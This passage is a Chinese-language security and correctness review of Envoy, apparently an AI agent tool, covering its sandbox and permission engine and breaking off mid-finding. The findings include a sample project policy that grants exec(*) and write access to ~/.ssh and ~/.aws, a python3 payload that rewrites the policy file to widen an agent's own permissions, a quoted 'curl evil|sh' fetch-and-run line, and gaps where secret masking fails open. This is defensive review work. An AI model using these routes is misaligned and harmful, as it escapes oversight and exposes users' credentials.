# Envoy 全项目审查：复核记录与结论

本文是对 Envoy 的一次完整审查的**复核留档**，共两轮。第一轮由五路并行 subagent 分层抽样审查得出，
第二轮补查第一轮未覆盖的盲区；两轮的每一条都回到源码重新验证，
因此不是「subagent 说了什么」，而是「什么在代码里成立」。

- 复核基线：`main` @ `5879505`，工作树含 79 个未提交改动。
- 复核手段：读源码 + `cargo test --workspace` + `cargo clippy --workspace --all-targets`
  + `cargo fmt --all -- --check` + `python3 scripts/check-file-sizes.py`。
- 结论分四档标记，**每条都标了档**：

| 标记 | 含义 |
| --- | --- |
| 已核对 | 本轮亲自读代码或跑命令得到，附行号 |
| 推断 | 从已核对的代码推出，但未跑通该路径 |
| 未核对 | 尚未验证，**不作结论** |
| 已推翻 | 第一轮提出，本轮验证不成立 |

总评与修复顺序见第 8 节。

---

## 1. 当前工作树状态（会随时间变化）

> 本节记录的是第一轮复核时的快照。修复后的最新状态见第 10 节。

这四项是「此刻红不红」，与架构缺陷不同，会随提交改变。

| 项 | 结果 | 状态 |
| --- | --- | --- |
| `cargo test --workspace` | 439 通过，0 失败 | 已核对 |
| `cargo clippy --workspace --all-targets` | 7 条 warning | 已核对 |
| `cargo fmt --all -- --check` | 13 个文件未过 | 已核对 |
| `scripts/check-file-sizes.py` | exit=0（44 个软限超标只打 warning） | 已核对 |

CI 以 `-D warnings` 跑 clippy（`.github/workflows/ci.yml:37`），所以当前这 7 条
**会直接让 CI 挂**，不是「可接受噪音」。7 条分布：

- `crates/envoy-core/src/workspace.rs:173`：`unneeded return`
- `crates/envoy-core/src/workspace.rs:185`：`useless format!`
- `crates/envoy-cli/src/tui/view/delegate.rs:8`：`manual is_multiple_of`
- 4 条 `too_many_arguments`：`agent/subagent/runner/run.rs:251`、`crates/envoy-core/src/workspace.rs:258`、
  `crates/envoy-cli/src/tui/state/sidechat.rs:197`、`crates/envoy-cli/src/tui/state/subagent.rs:174`

---

## 2. 安全边界问题

权限引擎的整体设计是可靠的（见第 6 节强项），缺陷集中在**边界处的输入没有被同等对待**。

### S1 项目策略文件可自我扩权，`extra_rw` 全程无受保护路径校验（高）

- 状态：已核对
- 证据：`permissions/rules.rs:92`（managed）、`:105`（user）、`:112`（project）三处把
  `PolicyFile.extra_rw` 直接并入 `LoadedPolicies.extra_rw`；
  `permissions/mod.rs:262`/`:286`/`:418` 把它送进 `sandbox_for`；
  `permissions/mod.rs:455` 的 `sandbox_for` 原样写进 `SandboxPolicy::WorkspaceWrite { extra_rw }`。
  `permissions/paths.rs:72` 明明有 `path_has_protected_component`，但**没有任何调用点校验 `extra_rw`**。
- 影响：克隆一个自带 `.envoy/permissions.json` 的仓库，内容写
  `{"allow":["exec(*)"],"extra_rw":["~/.ssh","~/.aws"]}`，用户点一次「信任此工作区」，
  此后每次自动放行的调用都会把 `~/.ssh`、`~/.aws` 以可写方式绑进 bwrap/seatbelt。
  项目级策略是仓库内容，属于不可信输入，却拿到了比用户级更高的能力。
- 建议：`extra_rw` 落地前逐个 `canonicalize` 并过 `path_has_protected_component`，
  命中即拒绝；同时禁止 project scope 提供 `extra_rw`（只允许 user/managed），
  或要求对每个路径单独弹一次确认。

### S2 `daemon stop` 拿 pid 文件里的数字盲发 SIGTERM（高）

- 状态：已核对
- 证据：`crates/envoy-agent/src/daemon.rs:390-404`。`stop()` 读 `envoy.pid`，只挡 `pid <= 0`
  和 `pid == 自己`，然后 `libc::kill(pid, SIGTERM)`。同文件的 `is_running()`
  用 socket 探活，但 `stop()` 没走这条路；pid 也没和任何身份绑定。
  已有测试 `daemon.rs:581` 只覆盖了非正数和自身 pid 两种拒绝。
- 影响：崩溃后残留的 pid 文件、或普通 pid 回收，会让 `envoy daemon stop`
  杀掉一个完全无关的用户进程。
- 建议：优先通过 `envoy.sock` 发 shutdown 控制请求；确实要发信号时用
  `pidfd_open` + `pidfd_send_signal`，或读 `/proc/<pid>/cmdline` 校验身份后再发，
  成功后删除 pid 文件。

### S3 受保护目录名大小写敏感（中）

- 状态：已核对
- 证据：`permissions/paths.rs:105`，`basenames.contains(&name.as_ref())` 是大小写敏感的；
  同函数里的 `WILDCARD_PROTECTED` 分支（`:112`）会 `to_ascii_lowercase`，
  但只在名字含 `*?[` 时才走。`is_env_filename` 是大小写不敏感的。
- 影响：macOS 默认 APFS 大小写不敏感，`.GIT/config`、`.SSH/id_ed25519`、`.Aws/credentials`
  指向的是同一个目录，却不被判为受保护。而 Seatbelt 的主要目标平台就是 macOS。
- 建议：`has_component_in` 统一用 `eq_ignore_ascii_case` 比较。

### S4 `write`/`edit` 的检查与使用是两条路径（中）

- 状态：已核对
- 证据：权限判定基于 `ResolvedPath.canonical`（`paths.rs:36` 的 `resolve_path_pair`），
  但工具执行时 `agent/tools/fs.rs:103` 把**原始 `args`** 交给
  `tools_core::write_raw(remote, target, Some(cwd), args, false)`，写入时再解析一次。
- 影响：判定与写入之间的窗口里，若有并发进程（或上一条被批准的沙箱命令）
  把路径换成指向工作区外的符号链接，写入就落到了判定之外。
  `write`/`edit` 背后没有 OS 沙箱兜底，这两条是纯用户态写入。
- 建议：把 canonical 路径传给工具，写入时用 `O_NOFOLLOW` /
  `openat2(RESOLVE_BENEATH)`，或在打开后复核一次解析结果。

### S5 审计写入失败被静默吞掉，版本不匹配不入审计（中）

- 状态：已核对
- 证据：`permissions/audit.rs:38-44`，`if let Ok(mut f) = open_append_private(&path)`
  加 `let _ = writeln!(...)`，失败无返回、无计数、无 UI 提示。
  另：`envoy-service/src/server.rs:140`/`:178` 的 `Reply::VersionMismatch` 分支
  **在** `audit(...)`（`:191`/`:200`）之前 return，所以版本错误的对端不留痕迹，
  而 `Denied` 会被记录。
- 影响：`AGENTS.md` 的不变量「every approval decision is audit-logged」实际是 best-effort。
  磁盘满、权限异常时，安全事件与普通日志一起消失，且没人知道。
- 建议：`record_decision` 返回 `Result`，失败时按 fail-closed 处理或至少向 UI 抛可见告警；
  版本不匹配回复前补一次 `audit`。

### S6 Landlock 主机上策略文件可被 agent 改写后重新加载（中，部分推断）

- 状态：已核对（能力声明与加载时机）+ 推断（具体绕过路径）
- 证据：`envoy-core/src/sandbox/mod.rs:69-74`，Landlock 明确声明
  `can_hide_secrets: false`、`can_protect_subpaths: false`（`PATH_BENEATH` 规则是纯加性的，
  无法在可写根内部再锁只读）。`permissions/mod.rs` 的 `loaded_policies()` 在每次
  `evaluate`/`authorize` 时重新读 JSON。
- 影响：在被批准的 `exec` 里改写 `.envoy/permissions.json`，下一次调用就会加载新的放行规则。
  字符串守卫能拦住 `> .envoy/permissions.json` 这种显式写法，
  但 `python3 -c "open('.envoy/permissions.json','w')..."` 这类不经过 `classify_argv` 的载荷可以绕过。
  本机是 bwrap（`can_protect_subpaths: true`），所以这条只影响 Landlock 主机。
- 建议：每个 turn 只加载一次策略并固定；后端 `can_protect_subpaths == false` 时
  拒绝加载 project 策略；策略文件加 mtime/hash 校验。

### S7 `--dangerously-skip-permissions` 的扩权不落明细（低）

- 状态：已核对（分支）+ 推断（审计字段粒度）
- 证据：`permissions/mod.rs:232` 在 `skip_perms` 时把 Ask 直接升为 `allow_net: true`
  并追加 `extra_rw`；同文件 `:485` 的 `None if skip_perms => DangerFullAccess`。
  审计只记 `dangerously_skip_permissions`，不记实际扩大了哪些根、是否开了网。
- 建议：审计里连同生效的 `SandboxPolicy` 一起落盘。

---

## 3. 正确性与一致性

### C1 `payload_len` 序列化失败返回 0，反而废掉了分帧保护（中高）

- 状态：已核对
- 证据：`envoy-proto/src/codec.rs:18-20`，`to_stdvec(msg).map(|b| b.len()).unwrap_or(0)`。
  两个消费点都靠它做决策：`runtime/live.rs:177` 记事件体积，
  `runtime/snapshot.rs` 的 `chunk_items` 用它把事件按 512 KiB 软上限切帧。
- 影响：编码失败的事件被当成 0 字节，会被整块塞进同一帧；随后帧体超过
  `MAX_FRAME_BYTES`，`write_framed` 报错，**整条 replay 流**失败——
  本该「丢掉一个坏事件」的场景变成「整条流死掉」。
- 建议：改成 `Result<usize>`/`Option<usize>`，不可编码的项按「必须瘦身或拒绝」处理，
  绝不当成免费。

### C2 慢订阅者被踢后，`SessionReset` 只进日志不投递（中）

- 状态：已核对
- 证据：`runtime/server.rs:143-156`。`TrySendError::Full` 时该订阅者被移除，
  `live.seq += 1` 并 `record_logged(live.seq, &SessionReset)`，但**没有向存活订阅者
  `try_send` 这个 reset**。`record_logged`（`runtime/live.rs:172-182`）只写入 `self.events` 回放缓冲。
- 影响：留在连接上的控制台看到 seq 从 N 跳到 N+2，且没有任何 reset 事件解释这个跳跃。
  重连的控制台能靠 `replay_window` 的 gap 检测恢复（`snapshot.rs`），
  所以丢事件的风险没有，但**在线流的 seq 连续性被破坏了**。
- 建议：记完 reset 后对保留下来的 sender 也 `try_send` 一次（尽力而为），让 seq 对所有人在线可见地连续。

### C3 摘要生成失败静默降级为确定性拼接（中）

- 状态：已核对
- 证据：`agent/context/summary.rs:297` `Err(_) => break`，之后 `:301`
  无条件 `Ok((merge_summary(previous, &dossier), usage))`。
- 影响：provider 报错、限流、网络断，全都被吞成「压缩成功」，但实际拿到的是
  `merge_summary` 的机械拼接，信息密度远低于模型摘要。调用方与用户都看不出降级了，
  而压缩质量直接决定后续长会话的可用性。
- 建议：至少在 `compacted` 事件里标注 `summary_source: Model | Fallback(reason)`，
  让 UI 能显示；失败原因不要丢。

### C4 控制台本地猜测 `running` 与队列（中，违反 AGENTS.md 不变量）

- 状态：已核对
- 证据：`tui/state/agent_events.rs:24` 用**文本相等**弹出队列
  （`self.agent.queued.front().map(|q| q == &text)`），同处 `:33` 直接
  `self.agent.running = true`；`tui/state/agent.rs:549` 在发送时就本地
  `queued.push_back(prompt)`。
- 影响：`AGENTS.md` 明写「Keep the daemon authoritative for `running`, queue, and
  turn completion. The console must never guess a turn is over.」
  实际是反过来的：重复 prompt 会错弹出队首，daemon 侧撤回队列时控制台不知道。
  另外一旦 daemon 没真正开跑，`running` 停在 true 会让动画 tick 以 30fps 空转。
- 建议：`queued` 改为读 daemon 的队列快照；`running` 只由 `TurnDone`/`TurnError`/快照清除，
  并给乐观置位加超时回滚。

### C5 `paint()` 在渲染入口做阻塞磁盘 I/O（中）

- 状态：已核对
- 证据：`tui/mod.rs:108` 的 `paint()` 第一行 `inputs::sync(app)`，然后才 `view::draw`；
  `drive.rs:154` 的 `paint_now()` 又先单独调一次 `inputs::sync(app)`。
  `tui/inputs.rs:137` 的 `sync` 里依次做 `workspace_index.ensure_fresh`（遍历工作区）、
  `complete_directories`（`read_dir`）、`fill_catalog`（探后端/读 MCP 配置/发现 skills/读 todos）、
  `refresh_media`（读媒体文件）。
- 影响：`view/` 目录本身零 I/O（这条规则字面成立，见第 6 节），
  但它保护的边界被包装层绕过了——**每一帧**都要等磁盘。
  `refresh_media` 读大文件时表现为明显掉帧。
- 建议：把 `sync` 挪到 `drive.rs` 的定时/wake 路径，`draw` 只消费已填好的快照。

### C6 两套协议版本号没有编译期绑定（低）

- 状态：已核对
- 证据：`envoy-agent/src/runtime/protocol.rs:15` `AGENT_PROTOCOL_VERSION: u32 = 8`，
  与 `envoy-proto` 的 `AGENT_VERSION`/`WIRE_VERSION` 只靠注释「bumped with…」关联。
  `envoy-proto/src/lib.rs` 内部有 `const _: () = assert!(WIRE_VERSION == AGENT_VERSION as u16)`，
  但 agent 侧没有对应断言。
- 影响：只改一边不会被编译拦住，只能在握手时按运行时失败发现。
- 建议：在 `runtime/protocol.rs` 加一行
  `const _: () = assert!(AGENT_PROTOCOL_VERSION as u8 == envoy_proto::AGENT_VERSION);`。

### C7 同步文件 I/O 出现在 async 任务里（中）

- 状态：已核对
- 证据：`envoy-service/src/server.rs:369` 在跟随日志的 async 循环里调
  `job::read_available(&path, ...)`，`:395` 直接 `std::fs::metadata`；
  `envoy-core/src/job.rs:349` 的 `snapshot()` 在持有队列表锁时 `std::fs::metadata`；
  `persist()` 在 `persist_lock` 下序列化并 `write`+`rename`，被 `submit()` 和每次 `finish()` 调用。
- 影响：N 个日志跟随者 + 并发 submit 会占满 tokio worker。
  `set_max_jobs`+`schedule()` 每次请求都跑，把这个问题放大。
- 建议：日志尾读与 `persist` 挪到 `spawn_blocking`；`log_bytes` 在锁外取。

### C8 `prune_at` 波段实际上永不触发，`skip_inplace_mask` 是只存在于测试的规格（中）

- 状态：已核对
- 证据：`agent/loop.rs:216` 只在 `before_tokens > plan.compact_at` 时才调
  `prepare_context_step`；而 `agent/context/mod.rs:191` 的 `prepare_context`
  内部门槛是 `before_tokens <= plan.prune_at` 才返回 `None`。
  两者叠加的结果：`prune_at < tokens <= compact_at` 这段**永远走不到** `prepare_context`。
  `context/mod.rs:317-322` 的 `skip_inplace_mask` 带着说明文字
  「While a turn sits between the prune and compact thresholds, mask once」，
  但它是 `#[cfg(test)]`，生产代码零调用点，只有 `agent/tests_phase5.rs:239-254` 在测它。
- 影响：两层门限里有一层是死的。mask 只在一次跨越 `compact_at` 时才跑，
  60%–85% 区间上下文只增不裁。`loop.rs:214` 的注释说明这是为了「保持 prompt 前缀稳定」的有意取舍
  （对应 `docs/decisions/004-two-stage-compaction-with-tail-retention.md`），
  所以这**更像是「规格写了两阶段、实现只做了一阶段」**，而不是单纯的 bug。
- 建议：要么把 loop 的门限改成 `plan.prune_at` 并让 `prepare_context` 返回
  `pruned_only` 结果（`mod.rs:198` 已有该分支），要么删掉 `prune_at` 与
  `skip_inplace_mask`，让规格和实现一致。二选一，不要留中间态。

---

## 4. 健壮性与性能

### R1 mask 跳过 2000 字节以下的工具输出（中）

- 状态：已核对
- 证据：`agent/context/mask.rs:11` `MASK_MIN_BYTES = 2_000`，`:28` 对
  `content.len() <= MASK_MIN_BYTES` 直接 `continue`。
- 影响：大量「几百字到 2KB」的工具输出永远不折叠。短会话靠摘要，
  长会话里这些中等块累积起来才是主要体积。
- 建议：对 tail 之外、2KB 以下的输出做行级折叠（保留首尾各若干行），而不是整个跳过。

### R2 transcript 渲染缓存满时整体清空（低）

- 状态：已核对
- 证据：`tui/view/transcript.rs:264-267`，缓存上限 256，`if cache.len() >= CAP { cache.clear(); }`。
- 影响：有界（这点是对的），但是悬崖式——超过 256 个渲染块后，
  整屏 markdown 从头重算一次。
- 建议：改 LRU 淘汰最旧一项。

### R3 选区快照按整屏分配 `String`（未核对）

- 状态：未核对（第一轮提出，本轮未读 `tui/view/mod.rs` 的 `snapshot_screen_lines`）
- 第一轮结论：拖选期间每个动画 tick 产生 `cols × rows` 次 `String` 分配。
- 待办：读 `snapshot_screen_lines` 确认，再决定是否要限制到选区矩形内。

### R4 `STREAM_IDLE` 断流会留下半截回复（推断）

- 状态：推断
- 依据：`agent/providers/mod.rs:25` `STREAM_IDLE = 120s`，`:102` 用
  `tokio::time::timeout(STREAM_IDLE, stream.next())` 包住读流，超时即返回错误。
  此时部分 `TextDelta` 已经发出。
- 待办：确认上层错误路径是否保留已收到的文本；若是直接 `TurnError`，
  用户会看到半句话加一个错误。

### R5 OpenAI 流式工具调用缺 index 时并入最后槽位（低，已是文档化行为）

- 状态：已核对
- 证据：`agent/providers/openai_chat.rs:205-224`，`remember_tool_delta` 的注释
  明写「Later argument deltas without an id append to the last slot」。
- 评估：这是有意设计，主流 provider 都会带 `index`。只有在对端同时省略
  `index` 与 `id` 且并行发两个工具时才会拼错。记为已知限制即可，不必改。

---

## 5. 工程卫生与文档漂移

### H1 尺寸规矩只有一半是真的

- 状态：已核对
- `24` 处 `#[allow(clippy::too_many_arguments)]`，分布在 16 个文件，
  重灾区 `agent/loop_hooks.rs`、`agent/loop_provider.rs`、`agent/context/mod.rs`。
  这不是 clippy 噪音，是「函数欠一个上下文结构体」的持续信号。
- `44` 个文件超 400 行软限；`scripts/check-file-sizes.py` 对软限只 `print` 到 stderr
  然后 `exit 0`，所以 CI 绿不代表规矩被守住。
- `crates/envoy-agent/src/runtime/server.rs` 原始 707 行、剔除 `#[cfg(test)]` 后 697 行，
  对 700 硬限只剩 3 行余量——下一次小改动就会红。
- `AGENTS.md` 写了「Functions: soft 60, hard 100」「nesting depth <= 3」，
  **没有任何检查器实现**。文档承诺大于工具约束。
- `6` 处 `#[allow(dead_code)]`，加 `runtime/mod.rs:30`、`tui/mod.rs:51` 的
  `unused_imports`，说明有半成品接口挂着。

### H2 文档与代码对不上（已核对逐条）

| 位置 | 问题 |
| --- | --- |
| `README.md` Layers 表 | 把 agent loop 记在 `envoy-cli`，写「Agent \| `envoy-cli` runtime」 |
| `README.md` Crates 段 | 只列 4 个 crate，**全文未出现 `envoy-agent`**（`grep` 零命中） |
| `ARCHITECTURE.md:15` | 仍把 `envoy-bridge` 列为 envoy 的二进制，该 crate 已删除 |
| `docs/architecture.md:100` | 指向 `crates/envoy-core/src/{sandbox.rs,...}`，实际是 `sandbox/` 目录 |
| `docs/MANUAL-TEST.md:8` | 用 `envoy ui`，现 CLI 是 `envoy serve` / 裸 `envoy` |
| `docs/MANUAL-TEST.md:25,100,119` | 用 `$B daemon start/stop`，同样过期 |
| `docs/MANUAL-TEST.md:65` | 写「6 个工具：exec/read/write/edit/ls/job」，与 README 的 8 个不一致 |
| `AGENTS.md` / `ARCHITECTURE.md` | 双份架构文档并存，易漂 |
| `crates/envoy-agent/tests/` | 目录存在但**空**（0 个条目） |

### H3 CI 与发布

- 状态：已核对
- CI 已经相当严：`fmt --check`、`clippy -D warnings --all-targets`、
  `test --workspace`、`check --all-targets`、ubuntu+macOS 双平台、
  shellcheck、py_compile、尺寸守卫（`.github/workflows/ci.yml:28-49`）。
- 缺口：无 `cargo doc`（无 rustdoc warning 门禁）、无 `cargo deny`/`cargo audit`、
  无重复依赖检查；MSRV 1.88 job（`ci.yml:48-49`）只 `check` 不 `test`。
- **发布真漏洞**：`.github/workflows/release.yml:28`
  `continue-on-error: ${{ matrix.os == 'ubuntu-24.04-arm' }}`，
  aarch64-linux 构建失败时 tag 仍能发布，而 README/INSTALL 承诺了该资产。
  发布侧也无 fmt/clippy，签名只有 sha256 校验和。

### H4 依赖面

- 状态：已核对
- workspace 层 `tokio = { features = ["full"] }`（`Cargo.toml:27`）是最宽的口子，
  `envoy-proto` 实际只需要 io/util。
- `similar` 在 `crates/envoy-agent/Cargo.toml:21` 与 `crates/envoy-cli/Cargo.toml:25`
  各声明一次，未提到 workspace 层。
- `postcard` 同时开 `alloc` 与 `use-std`，冗余。
- 正面：`reqwest` 用 rustls 且 `default-features = false`；没有 git-rev 依赖，
  没有 `=` 钉版本，无 proc-macro 重依赖。

---

## 6. 已推翻的第一轮结论

第一轮有 8 条判断经复核需要修正：下表 7 条（6 条不成立、1 条降级为设计），
另加 1 条需要精确化的边界问题（表后说明）。**记录下来，避免下次再被同样的推测带偏。**

| 第一轮结论 | 复核结果 | 依据 |
| --- | --- | --- |
| `monitor` 工具无条件放行，可绕过沙箱执行命令 | 不成立 | `agent/tools/monitor.rs:84` 起，`action=start` 带 `command` 时先走 `permissions.authorize_tool_call("exec", &exec_args, ...)`，复用完整 exec 权限与沙箱评估 |
| 残留 `.part` 文件会永久堵塞该路径写入 | 不成立 | `envoy-core/src/fs.rs:292` 的 `part_path` 生成 pid+原子序号唯一名，且有 `part_paths_are_unique_siblings` 并发测试（`:383`） |
| `scripts/__pycache__` 被提交进仓库 | 不成立 | `git ls-files scripts/` 只有 3 个脚本；`.gitignore:7` 已忽略 `__pycache__/` |
| `settle_background` 不推进刷新时钟导致忙等 | 不成立 | `tui/state/jobs.rs:6`，`App::refresh` 第一行就是 `self.jobs.last_refresh = Instant::now()` |
| `blocked_error` 的调用会以 `Value::Null` 参数执行工具 | 不成立 | `agent/tools/mod.rs:151` 先 `if let Some(blocked) = &prepared.blocked_error` 短路 |
| `prune_at` 可能大于 `compact_at` | 不成立 | `context/budget.rs:9` `MIN_CUSTOM_BUDGET = 16_000`，60% 即 9600，`.max(8_192)` 恒被压制，`prune_at < compact_at` 恒成立 |
| 压缩后二次溢出是 critical 缺陷 | 降级为设计 | `AGENTS.md`「For context compaction: … **one overflow retry**」明文规定只重试一次，`loop_provider.rs:141-150` 与之一致 |

另有一条需要精确化：第一轮说「渲染路径做 I/O 违反 view 不做 I/O 的规则」。
**规则本身是守住的**——`crates/envoy-cli/src/tui/view/` 下搜
`std::fs|std::process|reqwest|.await|read_to_string` 零命中。
问题出在 `paint()` 这层包装（见 C5），不是 view 内部。

---

## 7. 站得住的强项

这些是本轮亲自验证过的，不是文档转述。

- 分层被 Cargo 强制且无反向依赖：`proto -> core -> service -> agent -> cli`
  与 `Cargo.toml:3-9` 的 members 顺序一致；`envoy-agent` 无 TUI 依赖。
- 权限优先级显式且 fail-closed：`permissions/rules.rs` 在任何规则前先看
  `managed_error`，managed 策略解析失败返回 `deny`/`true`，没有「读失败就当放行」。
- 复合命令无法洗白：`permissions/match_rule.rs` 的 `find_match` 要求**每一段**都命中
  allow 规则，任一 `?` 返回 `None`，所以 `Bash(npm test*)` 不会被
  `npm test; curl evil|sh` 借用。
- 解析失败一律 ask：`permissions/shell.rs` 对未闭合引号、动态内建
  （`eval`/`source`/`exec`）、`env -S` 直接 bail，`ctx.parse_failed` 在
  Allow 规则之前检查，`symlink_escape`/`uses_sudo`/`protected_hit` 同理。
- 沙箱失败即拒绝且诚实上报能力：`host_without_sandbox` 直接 bail 而非裸跑；
  Landlock 如实声明 `can_hide_secrets: false`、`can_protect_subpaths: false`
  （`envoy-core/src/sandbox/mod.rs:69-74`），没有假装能做到。
- 帧解析防御到位：`envoy-proto/src/codec.rs` 在分配前拒绝超长、解码前校验
  `ENVY`+version、拒绝体走固定 8 KiB 栈缓冲、拒绝尾随字节，各有测试。
- 崩溃恢复有设计：`envoy-core/src/job.rs` 把 in-flight 任务恢复为 `Errored`，
  `next_id` 以 `max_existing_log_id` 兜底，坏掉的 `state.json` 不会覆盖已有 `N.log`。
- 工作流重放无竞态：`runtime/snapshot.rs` 的 `prepare_snapshot` 在同一把 `Live` 锁内
  取回放窗口与实时订阅，`Resume`→`from` 既不漏也不重。
- 协议覆盖由测试强制：`runtime/protocol.rs` 的 `assert_each` 对缺失**或重复**的
  变体索引都失败，新增 `AgentReq`/`AgentResp` 忘了样例会挂测试。
- 终端恢复做得很细：`tui/terminal.rs` 组合原子 `MODE_MASK`、一次性
  panic hook、`EntryRollback`、`Tui::drop`；`edit_file.rs` 在把 tty 交给 `$EDITOR` 前
  释放 mask，并用 `Resume` 的 Drop 守卫按正确顺序恢复。
- 测试贴模块而非追求覆盖率：`tests_security.rs` / `tests_stress.rs` /
  `tests_inspector.rs` 能从命名看出测的哪个面；`envoy-service/tests/` 有真实的
  conduit 控制 socket mock。

---

## 8. 结论与修复顺序

**评级。** 架构 A−：五层单向依赖、daemon 权威、显式权限优先级、快照渲染边界，
这些不变量在代码里真的落地了，不是纸面承诺；协议层的防御性与重放设计超出同规模项目。
安全 B+：机制扎实，缺口集中在「不可信输入的边界」（S1/S3/S4），属可定点修的洞，
不是结构性崩坏。整洁度 C+：24 处参数豁免、44 个文件超软限、规矩一半没检查器。
文档一致性 C：三处引用了不存在的路径/二进制，README 漏掉一整个 crate。
**当前可交付性：取决于两个会挂 CI 的红项（H1 的 clippy 7 条、13 个文件 fmt）。**

**修复顺序。** 先让树变绿，再堵安全洞，最后对齐文档。

1. 修 7 条 clippy + 13 个文件的 `cargo fmt`。这是当前唯一的硬门禁失败。
2. 堵 S1（`extra_rw` 受保护路径校验）与 S2（`stop()` 的 pid 校验）。
   这两条影响最大、改动最小。
3. 修 C1（`payload_len` 返回 `Result`）、C2（reset 投递给存活订阅者）。
4. 定夺 C8：`prune_at` 波段要么接上，要么连同 `skip_inplace_mask` 一起删掉。
5. 修 C4（队列/`running` 改由 daemon 权威）、C5（`sync` 移出渲染路径）。
6. S3/S4/S5/S6 与 C3、C7 作为第二批。
7. 一次性对齐 H2 的六处文档漂移，并把 `AGENTS.md` 的函数长度/嵌套规矩
   要么实现成检查器，要么从文档里删掉。

---

## 9. 第二轮：补查上一轮的盲区

上一轮末尾列出的「未核对」区域，本轮做了定向补查：`envoy-service` 的
`remote.rs`/`client.rs`/`policy.rs`/`conduit/*`，`runtime/{control,side,side_watch,monitors,hooks,listen,ops}.rs`，
`envoy-core/src/{fs,log,config,audit,workspace,sandbox/bwrap,seatbelt}.rs`，
`envoy-cli/src/{headless/, tui/mouse.rs, tui/state/edit.rs, tui/clipboard.rs, tui/diff.rs, tui/highlight.rs}`。

**19 条候选里 11 条成立、8 条被推翻。** 被推翻的 8 条同样列出来，理由见 9.3。

### 9.1 成立（本轮已核对源码）

**S8 bwrap 走查超上限时静默放弃遮蔽（安全，中）**

- 证据：`envoy-core/src/sandbox/bwrap.rs:278-280`，`seen_entries > MAX_WALK_ENTRIES`（4096）时
  直接 `return`，剩余子树**完全不遮蔽**。而同文件 `:5-7` 的模块文档写的是
  「masks … so an ancestor `--bind` (like `$HOME`) **can never unmask them**」。
- 影响：工作区或可写根里文件数超过 4096 时，遮蔽是 fail-open 的，
  与文档承诺相反。大仓库（`target/`、`node_modules/` 已被 `SKIP_WALK_DIRS` 跳过，
  但其它目录可以超）会命中。
- 建议：`bail!` 或保守地遮蔽整个父目录，不要静默放行；同时修文档措辞。

**S9 `max_depth = 1` 让嵌套 `.env` 不被遮蔽（条件性，中低）**

- 证据：`sandbox/bwrap.rs:199`，当可写根是 `/` 或是 home 时 `max_depth = 1`，
  `:296` 只在 `depth < max_depth` 时继续下探。于是 `$HOME` 的孙子目录里的 `.env`
  （如 `~/proj/.env`）不会被遮蔽。
- 边界：只有在可写根本身就是 `$HOME`（或 `/`）时才成立。远端 submit 在
  `Off`/`DangerFullAccess` 且 `cwd` 缺省或等于 home 时已被
  `envoy-service/src/policy.rs:157` 降级为 `ReadOnly`，所以远端推不动；
  这主要是本地 agent 以 home 为 cwd 时的缺口。

**C9 `start_turn` 丢弃自己的 claim 结果，可产生同会话两个并发回合（高）**

- 证据：`envoy-agent/src/runtime/server.rs:213-216`，
  `if state.phase == LivePhase::Idle { state.claim(LivePhase::RunningTurn); }` ——
  **返回值被丢掉，函数继续往下走**。随后 `:377-378` 无条件
  `state.turn = Some(turn); state.pump = Some(pump);`，覆盖掉前一个回合的 handle。
- 可达路径：`runtime/side.rs:59-66` 的 `queue_plan_or_start` 在锁内只看
  `phase == RunningTurn || running` 就决定「起不起」，**自己不 claim**；
  它返回 `Some(prompt)` 到 `side_watch.rs:158-164` 调 `start_turn` 之间锁已释放。
  这个窗口里若有一次 `send` 走 `server.rs:424-437` 成功 claim，则 `start_turn`
  进来时 phase 已是 `RunningTurn`，claim 失败但**照样起第二个回合**。
- 后果比「多跑一次」严重：`state.turn` 被覆盖，第一个回合的 `JoinHandle` 直接丢失，
  `interrupt()`（`server.rs:545-557`）只能 abort 新的那个，旧回合永远无法打断，
  两个回合同时往同一份 `messages` 回写。
- 建议：`start_turn` 在 claim 失败时直接返回并发 `TurnError`（与 `server.rs:424-437`
  的处理一致）；`queue_plan_or_start` 改成「判定 + claim」原子完成。

**C10 `close_session` 的检查与移除之间有窗口，且 `Live` 没有 `Drop`（中）**

- 证据：`runtime/hooks.rs:251-263`，`let state = live.lock().unwrap(); if state.running { bail! }`
  之后**立即释放锁**，再 `remove_session(id)`。`grep 'impl Drop for Live'` 在整个
  `envoy-agent/src` 下**零命中**，`live.rs:95` 的 `turn: Option<JoinHandle>` 被 drop 时
  只会丢弃 handle，**不会 abort 任务**。
- 影响：窗口内起一个回合，会话被移除后该回合继续调 provider，没有会话可打断；
  同时 pump 仍在往已移除的 `Live` 写事件。
- 建议：`impl Drop for Live` 里 abort `turn`/`pump`/side 任务；`running` 复查放在
  移除的同一次锁内（或给会话加一个 closing 标记）。

**C11 `MonitorEntry::drop` 在非 runtime 线程上静默跳过取消（中）**

- 证据：`runtime/monitors.rs:50`，`let Ok(handle) = tokio::runtime::Handle::try_current() else { return; };`
  —— 在 runtime 之外析构（含 runtime teardown 期间）时直接返回，
  `remote.cancel(&target, job_id)` 永不发出。
- 影响：`owns_job` 的监控条目被淘汰时，被监控的 job 变成孤儿进程继续跑，
  没有任何地方记录它。
- 建议：把取消动作投递到一个由 `Runtime` 持有的长生命周期任务队列，
  不要依赖析构时的 `try_current()`。

**C12 审计轮转并发时销毁刚生成的那一代（中）**

- 证据：`envoy-core/src/audit.rs:18-20`，`let _ = std::fs::remove_file(&rotated); let _ = std::fs::rename(path, rotated);`
  两步之间无锁。两个线程同时越过 `:15` 的体积检查后：
  T1 `remove .1` → `rename log→.1` 成功；T2 `remove .1` **删掉 T1 刚转出的 10 MB**，
  再 `rename` 时 `log` 已不存在，错误被 `let _` 吞掉。
- 影响：`AGENTS.md` 的「every approval decision is audit-logged」在恰好跨越
  10 MiB 边界的并发写入下会丢一整代审计——丢的正是最新的那一代。
  同一个 `rotate_if_oversized` 被 `permissions/audit.rs:31` 与 hooks 审计复用，影响面一致。
- 建议：用 `flock` 串行化轮转；先 `rename` 成功再删旧代；失败要能被观察到。

**R6 conduit 控制面读无超时（中）**

- 证据：`envoy-service/src/conduit/mod.rs:396`，`let n = stream.read(&mut buf).await?;`
  没有任何 `timeout`；`MAX_RESPONSE` 只在 `:401` 收到数据之后才检查。
- 影响：conduit 挂住不写也不关连接时，`status`/`get_json` 一类调用永久悬挂，
  控制台表现为「点了没反应」。
- 建议：`read` 包 `tokio::time::timeout(10s, ...)`，并对整个 `get_json` 设总预算。

**R7 headless 丢弃全部 stdout 写错误（中）**

- 证据：`envoy-cli/src/headless/output.rs` 里 `let _ = writeln!/write!/flush!` 共 18 处
  （`:66`、`:75`、`:88`、`:115`、`:150` 等均为该形态）。
- 影响：`envoy -p '...' --output-format stream-json | head -c 200` 触发 EPIPE 后，
